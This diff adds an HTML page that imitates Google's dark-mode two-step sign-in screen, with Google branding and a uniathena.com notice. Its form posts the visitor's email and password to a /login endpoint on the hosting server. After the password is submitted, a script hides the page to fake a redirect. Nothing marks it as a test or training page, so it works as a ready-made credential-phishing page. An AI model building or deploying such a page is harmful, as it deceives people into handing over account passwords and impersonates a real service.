@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Google</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for the dark theme and Inter font */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
+
+        :root {
+            /* Define the Google-like dark mode colors */
+            --google-blue: #8ab4f8;
+            /* Primary action color */
+            --dark-bg: #202124;
+            /* Body background */
+            --card-bg: #292a2d;
+            /* Card background */
+            --text-primary: #e8eaed;
+            /* Main text color */
+            --text-secondary: #bdc1c6;
+            /* Subtext/Helper text */
+            --link-color: #8ab4f8;
+            --input-border: #5f6368;
+            /* Input border color */
+            --chip-bg: #3c4043;
+            /* Email chip background */
+            --google-gray: #303134;
+            /* Hover state for Create account/links */
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--dark-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1rem;
+            margin: 0;
+            position: relative;
+        }
+
+        .login-card {
+            background-color: var(--card-bg);
+            max-width: 450px;
+            width: 100%;
+            /* Set a minimum height for consistent centering */
+            min-height: 580px;
+            padding: 3rem 2.5rem;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Ensure the form takes up all available space within the card */
+        #loginForm {
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        /* --- Floating Label Input System (Simplified for the Google look) --- */
+        .input-container {
+            position: relative;
+            margin-top: 16px;
+            margin-bottom: 8px;
+        }
+
+        .custom-input {
+            width: 100%;
+            /* Taller padding for a large, comfortable field */
+            padding: 22px 16px 8px;
+            background-color: transparent;
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            color: var(--text-primary);
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-label {
+            position: absolute;
+            top: 18px;
+            left: 16px;
+            color: var(--text-secondary);
+            font-size: 16px;
+            pointer-events: none;
+            transition: transform 0.2s, font-size 0.2s, color 0.2s;
+        }
+
+        /* Input Focused State */
+        .custom-input:focus {
+            border-color: var(--google-blue);
+            border-width: 2px;
+            /* Makes the border pop slightly */
+            padding-left: 15px;
+            padding-right: 15px;
+            box-shadow: none;
+        }
+
+        /* Input Focused or Filled - Move Label Up */
+        .custom-input:focus+.input-label,
+        .custom-input.has-content+.input-label {
+            transform: translateY(-12px);
+            font-size: 13px;
+            background-color: var(--card-bg);
+            padding: 0 4px;
+            left: 12px;
+        }
+
+        /* Input Focused - Blue label */
+        .custom-input:focus+.input-label {
+            color: var(--google-blue);
+        }
+
+        /* Next button styling */
+        .next-btn {
+            background-color: var(--google-blue);
+            color: #202124;
+            font-weight: 500;
+            padding: 10px 24px;
+            border-radius: 6px;
+            /* Slightly rounded corners */
+            transition: opacity 0.2s ease, background-color 0.2s ease;
+            min-width: 70px;
+        }
+
+        .next-btn:hover:not(:disabled) {
+            opacity: 0.9;
+            background-color: #6d9be7;
+            /* Slightly darker hover */
+        }
+
+        .next-btn:disabled {
+            background-color: var(--google-gray);
+            color: var(--text-secondary);
+            cursor: not-allowed;
+            opacity: 0.6;
+            transform: none;
+        }
+
+        /* Styling for the user email chip in Step 2 */
+        .user-chip {
+            background-color: transparent;
+            border: 1px solid var(--input-border);
+            border-radius: 20px;
+            padding: 6px 12px;
+            cursor: pointer;
+            width: fit-content;
+        }
+
+        .user-chip:hover {
+            background-color: var(--google-gray);
+            border-color: var(--google-gray);
+        }
+
+        /* Link styling for "Create account" and "Forgot email?" */
+        .action-link {
+            color: var(--link-color);
+            padding: 8px 0;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+            font-weight: 500;
+            display: inline-block;
+        }
+
+        .action-link:hover {
+            background-color: rgba(138, 180, 248, 0.1);
+        }
+
+
+        /* Footer styling for full responsiveness */
+        .page-footer {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            background-color: var(--dark-bg);
+            padding: 1rem 0;
+            z-index: 10;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 800px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 0 1rem;
+        }
+
+        /* Responsive adjustments for smaller screens (Mobile) */
+        @media (max-width: 640px) {
+            .login-card {
+                padding: 1.5rem 1.5rem;
+                min-height: 100vh;
+                border-radius: 0;
+                box-shadow: none;
+                margin: 0;
+                padding-bottom: 5rem;
+            }
+
+            .page-footer {
+                padding: 0.5rem 0;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .footer-content select,
+            .footer-content div {
+                margin-bottom: 0.5rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-card" id="loginCard">
+
+        <!-- Header: "Sign in with Google" -->
+        <div class="flex items-center space-x-2 mb-10">
+            <!-- Google 'G' Icon SVG - simplified to match the screenshot better -->
+            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="48" height="48" viewBox="0 0 48 48">
+                <path fill="#FFC107"
+                    d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z">
+                </path>
+                <path fill="#FF3D00"
+                    d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z">
+                </path>
+                <path fill="#4CAF50"
+                    d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z">
+                </path>
+                <path fill="#1976D2"
+                    d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z">
+                </path>
+            </svg>
+
+            <span class="text-xl text-text-primary font-light">Sign in with Google</span>
+        </div>
+
+        <!-- The main form container for inputs -->
+        <form method="POST" action="/login">
+
+            <!-- STEP 1: Email or Phone Entry (Visible by default) -->
+            <div id="step-1-container" class="space-y-6 flex-grow flex flex-col">
+                <h1 class="text-3xl font-normal text-text-primary">Sign in</h1>
+
+                <!-- Email/Phone Input with Floating Label -->
+                <div class="input-container">
+                    <input type="email" id="emailInput" class="custom-input" name="username" required>
+                    <label for="emailInput" class="input-label">Email or phone</label>
+                </div>
+
+                <!-- Forgot Email Link -->
+                <a href="#" class="action-link text-sm w-fit">Forgot email?</a>
+
+                <!-- Privacy/Service Text (using uniathena.com as in the image) -->
+                <p class="text-sm text-text-secondary pt-6">
+                    Before using this app, you can review <span
+                        class="font-medium text-text-primary">uniathena.com</span>'s
+                    <a href="#" class="text-link-color hover:underline">privacy policy</a> and
+                    <a href="#" class="text-link-color hover:underline">terms of service</a>.
+                </p>
+                <!-- Action Buttons for Step 1 -->
+                <div class="flex justify-between items-center mt-auto pt-10">
+                    <a href="#" class="action-link text-link-color px-3 py-2 rounded-lg font-medium">
+                        Create account
+                    </a>
+                    <!-- Button type is "button" to use JavaScript for step navigation -->
+                    <button type="button" id="nextBtn1" class="next-btn" onclick="handleNextStep(1)" disabled>
+                        Next
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 2: Password Entry (Initially Hidden) -->
+            <div id="step-2-container" class="hidden space-y-6 flex-grow flex flex-col">
+                <h1 class="text-3xl font-normal text-text-primary">Welcome</h1>
+
+                <!-- User Email Display Chip (Clickable to go back) -->
+                <div class="flex items-center text-sm space-x-2 user-chip mb-8" onclick="handleNextStep(0)">
+                    <!-- Profile icon (used placeholder icon) -->
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                        class="lucide lucide-user text-white h-4 w-4">
+                        <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
+                        <circle cx="12" cy="7" r="4" />
+                    </svg>
+                    <span id="userEmailDisplay" class="text-sm text-text-primary font-medium"></span>
+                    <!-- Down arrow icon -->
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                        class="lucide lucide-chevron-down text-text-secondary h-4 w-4">
+                        <path d="m6 9 6 6 6-6" />
+                    </svg>
+                </div>
+
+                <!-- Password Input with Floating Label -->
+                <div class="input-container">
+                    <input type="password" id="passwordInput" class="custom-input" name="password" required>
+                    <label for="passwordInput" class="input-label">Enter your password</label>
+                </div>
+
+                <!-- Show Password Checkbox -->
+                <div class="flex items-center pt-2">
+                    <input type="checkbox" id="showPassword"
+                        class="h-5 w-5 rounded border-gray-500 text-link-color focus:ring-link-color bg-gray-700"
+                        onchange="togglePasswordVisibility()">
+                    <label for="showPassword" class="ml-2 text-sm text-text-secondary select-none">Show password</label>
+                </div>
+
+                <!-- Try another way link -->
+                <a href="#" class="action-link text-sm w-fit pt-6">Try another way</a>
+
+                <!-- Privacy/Service Text -->
+                <p class="text-sm text-text-secondary pt-6">
+                    Before using this app, you can review <span
+                        class="font-medium text-text-primary">uniathena.com</span>'s
+                    <a href="#" class="text-link-color hover:underline">privacy policy</a> and
+                    <a href="#" class="text-link-color hover:underline">terms of service</a>.
+                </p>
+
+                <!-- Action Buttons for Step 2 -->
+                <div class="flex justify-end items-center mt-auto pt-10">
+                    <!-- Button type is "button" to use JavaScript for success simulation -->
+                    <button type="submit" id="nextBtn2" class="next-btn">
+                        Next
+                    </button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <!-- Footer - Fixed position for perfect placement -->
+    <footer class="page-footer text-sm text-text-secondary">
+        <div class="footer-content">
+            <!-- Language Selector -->
+            <select
+                class="bg-transparent border-none text-text-secondary p-1 rounded appearance-none cursor-pointer hover:bg-google-gray">
+                <option value="en">English (United States)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+            </select>
+            <!-- Help/Privacy/Terms Links -->
+            <div class="flex space-x-4">
+                <a href="#" class="hover:underline">Help</a>
+                <a href="#" class="hover:underline">Privacy</a>
+                <a href="#" class="hover:underline">Terms</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Global state and references
+        let currentStep = 1;
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const nextBtn1 = document.getElementById('nextBtn1');
+        const nextBtn2 = document.getElementById('nextBtn2');
+        const step1Container = document.getElementById('step-1-container');
+        const step2Container = document.getElementById('step-2-container');
+        const userEmailDisplay = document.getElementById('userEmailDisplay');
+        const loginCard = document.getElementById('loginCard');
+
+        // --- Floating Label Logic ---
+
+        /**
+         * Checks if an input field has content and applies the 'has-content' class
+         * to trigger the floating label animation/style.
+         */
+        function updateLabelClass(input) {
+            if (input.value.trim() !== '') {
+                input.classList.add('has-content');
+            } else {
+                input.classList.remove('has-content');
+            }
+        }
+
+        /**
+         * Attaches listeners to input fields to handle floating label behavior 
+         * and button state checks.
+         */
+        function setupFloatingLabelsAndValidation() {
+            [emailInput, passwordInput].forEach(input => {
+                updateLabelClass(input);
+
+                input.addEventListener('input', () => {
+                    updateLabelClass(input);
+                    if (input === emailInput) {
+                        checkStep1Input();
+                    } else if (input === passwordInput) {
+                        checkStep2Input();
+                    }
+                });
+
+                input.addEventListener('blur', () => {
+                    updateLabelClass(input);
+                });
+            });
+            checkStep1Input();
+            checkStep2Input();
+        }
+
+        // --- Input Validation Functions ---
+
+        function checkStep1Input() {
+            // Enable Next button if the email field has content
+            nextBtn1.disabled = emailInput.value.trim().length === 0;
+        }
+
+        function checkStep2Input() {
+            // Enable Next button if the password field has content
+            nextBtn2.disabled = passwordInput.value.trim().length === 0;
+        }
+
+        // --- Step Management Functions ---
+
+        /**
+         * Handles navigation between the login steps.
+         * @param {number} step - 1 for email, 2 for password check, 0 to go back.
+         */
+        function handleNextStep(step) {
+            if (step === 1) {
+                // Email step completion -> move to Password step
+                const email = emailInput.value.trim();
+                if (email) {
+                    userEmailDisplay.textContent = email;
+                    showStep(2);
+                }
+            } else if (step === 2) {
+                // Password step completion -> simulate successful login and redirect
+                if (passwordInput.value.trim()) {
+                    showSuccess();
+                }
+            } else if (step === 0) {
+                // Go back to Email step (triggered by clicking the user chip)
+                showStep(1);
+            }
+        }
+
+        function showStep(step) {
+            currentStep = step;
+
+            // Hide all step containers
+            step1Container.classList.add('hidden');
+            step2Container.classList.add('hidden');
+
+            if (step === 1) {
+                step1Container.classList.remove('hidden');
+                passwordInput.value = ''; // Clear password on navigation back
+                updateLabelClass(passwordInput);
+                checkStep1Input();
+                emailInput.focus();
+            } else if (step === 2) {
+                step2Container.classList.remove('hidden');
+                checkStep2Input();
+                passwordInput.focus();
+            }
+        }
+
+        function showSuccess() {
+            // As requested, immediately hide the entire card to simulate instant redirection.
+            loginCard.classList.add('hidden');
+
+            console.log("Login Successful. Simulating immediate redirection away from the page.");
+            // In a real application, you would perform an AJAX POST request here
+            // and then perform window.location.href = "/dashboard";
+        }
+
+
+        // --- UI Utility Functions ---
+
+        function togglePasswordVisibility() {
+            const checkbox = document.getElementById('showPassword');
+            passwordInput.type = checkbox.checked ? 'text' : 'password';
+        }
+
+        // Add keyboard support (Enter key)
+        document.addEventListener('keypress', (e) => {
+            // Only submit if Enter is pressed and the active step's button is enabled
+            if (e.key === 'Enter') {
+                if (currentStep === 1 && !nextBtn1.disabled) {
+                    handleNextStep(1);
+                } else if (currentStep === 2 && !nextBtn2.disabled) {
+                    handleNextStep(2);
+                }
+            }
+        });
+
+
+        // Initialize the app on load
+        window.onload = () => {
+            setupFloatingLabelsAndValidation();
+            showStep(1);
+        };
+
+    </script>
+</body>
+
+</html>
